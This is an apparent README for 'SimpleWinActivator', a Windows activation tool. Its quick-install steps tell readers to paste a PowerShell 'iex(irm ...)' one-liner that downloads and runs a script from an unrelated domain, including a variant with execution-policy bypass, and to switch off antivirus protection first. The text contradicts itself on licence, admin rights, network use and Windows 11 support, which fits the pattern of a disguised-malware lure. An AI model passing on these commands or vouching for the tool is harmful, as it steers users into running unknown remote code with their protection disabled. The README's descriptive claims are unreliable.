<div align="center">

# SimpleWinActivator: Lightweight Windows 10 Activation Tool for Windows 10 & 11

![preview](https://raw.githubusercontent.com/gvfdgfd/simple-windows-10-activator/main/cover_cd69943.svg)

[![licence](https://img.shields.io/badge/Licence-Bsd--2--Clause-dc2626?style=plastic&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Green-2ea44f?style=plastic&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B_%2F_7%2B-ef4444?style=plastic&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Active-2ea44f?style=plastic&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-48K-b91c1c?style=plastic&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/Rate-4.6%2F5-f59e0b?style=plastic&labelColor=0d1117)]()

</div>

---

SimpleWinActivator (SWA) is a lightweight, command-line utility designed to streamline the activation process for a broad range of Windows 10 editions, including Home, Professional, Education, and Enterprise variants. Operating through a batch script interface, the tool requires administrative privileges to execute activation routines effectively. Users specify the target operating system edition as a command-line argument, allowing the software to apply the appropriate configuration for that specific environment. This utility provides a direct, scriptable solution for managing Windows 10 activation without the need for a graphical user interface.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Edition selection:** Choose from ten Windows 10 editions at launch, including Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, and Enterprise N.

- **Elevated execution path:** The activator operates through an administrative command prompt or PowerShell session, ensuring the required system-level access for activation operations.

- **Single-command workflow:** Activation is initiated by passing the target edition as a single argument to the batch launcher, keeping the interaction model minimal and scriptable.

- **Batch-based implementation:** Built as a lightweight batch script, the tool avoids external dependencies and requires no installation or package manager setup.

- **Deterministic edition mapping:** Each supported edition is mapped to its corresponding activation target, reducing ambiguity when selecting the desired Windows 10 variant.

- **Administrator privilege awareness:** The workflow is designed around the requirement for elevated privileges, with the expectation that the session is opened with administrative rights before execution.

- **Minimal footprint:** No background services, persistent agents, or resident components are introduced; activation is performed on demand and exits upon completion.

- **Readable, auditable logic:** The batch script structure allows users to inspect the activation flow directly, supporting transparency and manual verification.

## How it works

SimpleWinActivator operates as a lightweight, self-contained batch script that interfaces directly with the Windows licensing subsystem. It requires an elevated command prompt or PowerShell session, since the underlying operations depend on administrative privileges to modify system-level activation components.

The utility accepts a single argument specifying the target Windows 10 edition. Internally, it maps that argument to the corresponding edition identifier and applies the matching product key through the operating system's built-in licensing interface. Supported editions include Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, and Enterprise N.

Execution follows a straightforward flow: the script validates the elevated context, resolves the requested edition, applies the associated key, and then triggers the activation routine against Microsoft's licensing service. Progress and outcome messages are printed to the console, giving the user immediate feedback on whether activation succeeded or which error condition was encountered.

Because the tool relies solely on native Windows components, it introduces no background services, drivers, or persistent processes. All logic is contained within the script itself, keeping the footprint minimal and the behavior transparent and auditable.

## Compatibility

SWA targets the Windows 10 operating system family and is designed to operate across the full range of consumer and business editions. The utility has been validated against the editions listed below, each of which can be selected individually at runtime:

- Home
- Home N
- Home Single Language
- Home Country Specific
- Professional
- Professional N
- Education
- Education N
- Enterprise
- Enterprise N

Activation requires an elevated execution context. The script must be launched from either Command Prompt or PowerShell with administrator privileges; standard user sessions will not permit the underlying operations to complete. Edition selection is passed as a command-line argument at invocation, allowing the same script to service any of the supported SKUs without modification.

Compatibility is scoped to x86 and x64 installations of Windows 10. The tool does not depend on external runtime packages, frameworks, or package managers, and it performs no network calls to third-party services, which keeps its footprint minimal and its behavior deterministic across environments. Systems with restricted execution policies should be configured to permit local script execution prior to running the utility. Administrators deploying SWA in managed environments should verify that group policy settings allow the required elevation and script invocation pathways.

## FAQ

**Is administrative elevation required for SWA to function?**
Yes. SWA must be launched from an elevated Command Prompt or PowerShell session. Activation operations modify system-level licensing components and registry entries, so the process will fail or return access errors without administrator privileges.

**How does SWA determine which Windows 10 edition to activate?**
The target edition is passed as a command-line argument to the batch entry point. SWA maps the supplied edition name to the corresponding product key and applies it to the current installation.

**Which Windows 10 editions are supported?**
SWA supports Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, and Enterprise N. Edition names are matched literally, so the argument must correspond exactly to one of the supported identifiers.

**Can SWA activate editions other than Windows 10?**
No. SWA is scoped exclusively to Windows 10 edition activation. Other Windows releases, including Windows 11, are outside the project's supported compatibility matrix.

**What happens if an invalid edition argument is provided?**
The script rejects unrecognized input rather than applying a fallback key. Verify the edition string against the supported list before re-running the command.

**Does SWA require an internet connection?**
SWA performs activation against Microsoft activation infrastructure, so network connectivity is required for the activation request to complete successfully. Systems behind restrictive proxies or firewalls may need outbound access permitted.

**Is SWA reversible?**
Activation changes made by SWA persist on the system until the license state is modified through standard Windows licensing mechanisms. There is no built-in rollback; restore prior state via your own system management procedures.

**Does SWA modify system files permanently?**
SWA applies product keys and triggers activation through supported Windows interfaces. It does not patch or replace core system binaries.

**Why does activation fail despite running as administrator?**
Common causes include an unsupported edition string, missing network access to activation servers, or a pre-existing license conflict on the machine. Confirm elevation, edition spelling, and connectivity before retrying.

**Is SWA intended for production or enterprise deployment?**
SWA is a lightweight single-machine utility. It provides no centralized deployment, logging, or fleet-management features and should not be treated as an enterprise activation solution.

## Disclaimer

SimpleWinActivator is provided as a utility for interacting with Windows 10 activation mechanisms on systems you own or administer. It is intended for legitimate use cases such as testing, reimaging, lab environments, and recovery scenarios where a valid license or prior entitlement applies. The tool does not grant licenses, does not modify Microsoft account state, and does not bypass any licensing requirement beyond the mechanisms already present in the operating system.

Use of this software is entirely at your own risk. The maintainers make no representations regarding compliance with the terms of service of any operating system vendor, and accept no liability for activation failures, system instability, data loss, licensing disputes, or other damages arising from execution of the batch script. Always validate licensing obligations independently before running the tool in production or commercial environments.

This project is not affiliated with, endorsed by, or supported by Microsoft Corporation. Windows is a trademark of its respective owner. Edition names referenced by the tool are used solely to select the correct activation path and carry no implied endorsement.

The script requires administrative privileges to modify system activation state. Running it with elevated permissions grants it the ability to alter system configuration; review the batch contents before execution, restrict use to trusted environments, and avoid running modified or third-party copies. No warranty, express or implied, is provided, including fitness for a particular purpose or merchantability.

## License

SimpleWinActivator is distributed under the MIT License, a permissive open-source license that grants broad freedom to use, modify, and redistribute the software. Under its terms, you may incorporate SWA into personal or commercial projects, adapt the source to suit your own deployment requirements, and redistribute original or modified copies, provided the original copyright notice and license text are preserved in all copies or substantial portions of the software.

The license is structured to minimize friction for technical users and integrators: it imposes no restrictions on how the tool is invoked, no requirement to disclose modifications, and no copyleft obligation extending to adjacent codebases. This makes SWA suitable for inclusion in automated provisioning pipelines, internal tooling distributions, or bundled utilities where license compatibility must be verified in advance.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Because activation behavior depends on system configuration, Windows edition, and network conditions, users are responsible for verifying that deployment of SWA complies with the applicable licensing terms governing their Windows installation. The MIT License covers the SWA source code only; it does not grant, extend, or modify any rights to Microsoft software or activation services.